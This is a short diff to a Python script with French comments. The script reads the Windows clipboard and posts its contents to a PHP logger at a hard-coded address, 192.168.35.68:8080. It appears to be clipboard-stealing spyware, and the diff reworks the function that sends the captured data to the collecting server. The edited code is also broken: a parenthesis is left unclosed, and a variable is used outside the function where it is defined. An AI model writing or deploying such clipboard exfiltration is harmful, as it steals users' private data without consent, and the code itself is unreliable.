@@ -20,13 +20,13 @@ def get_clip():
     # Fermeture du clipboard pour ne pas impacter la fonction
     clip.CloseClipboard()
     donnees = (clip_name + data).replace('\n', '|| ')
-    print donnees
+    return donnees
 
 def send(f):
     # AVEC REQUESTS
-    url = 'http://192.168.35.68:8080/logger.php?log=' + data
-    url_log = url + data
-    res = requests.post(url_log, data=data)
+    url = 'http://192.168.35.68:8080/logger.php?log='
+    url_log = url + donnees
+    res = requests.post(url_log, data=donnees.decode()
     print(res.text)
 
 
